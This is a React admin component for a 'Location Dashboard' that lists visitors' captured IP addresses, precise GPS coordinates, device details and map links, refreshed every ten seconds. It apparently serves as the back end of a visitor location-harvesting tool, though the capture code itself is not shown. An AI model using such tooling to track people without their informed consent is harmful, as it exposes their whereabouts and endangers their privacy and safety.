'use client';

import { useEffect, useState } from 'react';

export default function Admin() {
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(true);

  const fetchLogs = async () => {
    try {
      const res = await fetch('/api/logs');
      const data = await res.json();
      setLogs(data);
    } catch (error) {
      console.error('Error fetching logs:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchLogs();
    // Refresh every 10 seconds
    const interval = setInterval(fetchLogs, 10000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-[#050505] text-white p-8 font-sans">
      <div className="max-w-6xl mx-auto">
        <header className="flex justify-between items-center mb-12">
          <div>
            <h1 className="text-3xl font-bold tracking-tight">Location Dashboard</h1>
            <p className="text-gray-400 mt-1">Real-time captured visitor coordinates</p>
          </div>
          <button 
            onClick={fetchLogs}
            className="px-4 py-2 bg-[#111] border border-[#222] rounded-lg hover:bg-[#1a1a1a] transition-colors text-sm font-medium"
          >
            Refresh Logs
          </button>
        </header>

        {loading ? (
          <div className="flex justify-center py-20">
            <div className="w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
          </div>
        ) : logs.length === 0 ? (
          <div className="text-center py-20 bg-[#0a0a0a] rounded-2xl border border-[#1a1a1a]">
            <p className="text-gray-500">No locations captured yet.</p>
          </div>
        ) : (
          <div className="grid gap-6">
            {logs.map((log) => (
              <div key={log.id} className="bg-[#0a0a0a] border border-[#1a1a1a] rounded-2xl p-6 hover:border-blue-500/30 transition-all group">
                <div className="grid md:grid-cols-4 gap-6 items-center">
                  <div className="space-y-1">
                    <p className="text-xs font-bold text-gray-500 uppercase tracking-wider">Timestamp</p>
                    <p className="font-medium text-sm">{new Date(log.timestamp).toLocaleString()}</p>
                    <p className="text-xs text-blue-400">{log.ip}</p>
                  </div>
                  
                  <div className="space-y-1">
                    <p className="text-xs font-bold text-gray-500 uppercase tracking-wider">Coordinates</p>
                    <p className="font-mono text-sm">{log.lat.toFixed(6)}, {log.lon.toFixed(6)}</p>
                    <p className="text-xs text-gray-500">Accuracy: ±{log.accuracy.toFixed(1)}m</p>
                  </div>

                  <div className="space-y-1">
                    <p className="text-xs font-bold text-gray-500 uppercase tracking-wider">Device Info</p>
                    <p className="text-xs text-gray-300 truncate max-w-[200px]" title={log.userAgent}>
                      {log.userAgent}
                    </p>
                    <p className="text-[10px] text-gray-500">{log.platform} • {log.screen}</p>
                  </div>

                  <div className="flex justify-end">
                    <a 
                      href={log.googleMapsUrl} 
                      target="_blank" 
                      rel="noopener noreferrer"
                      className="inline-flex items-center px-4 py-2 bg-blue-600 text-white rounded-xl text-sm font-bold hover:bg-blue-700 transition-all shadow-lg shadow-blue-500/20 group-hover:scale-105 active:scale-95"
                    >
                      <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z" clipRule="evenodd" />
                      </svg>
                      View on Map
                    </a>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
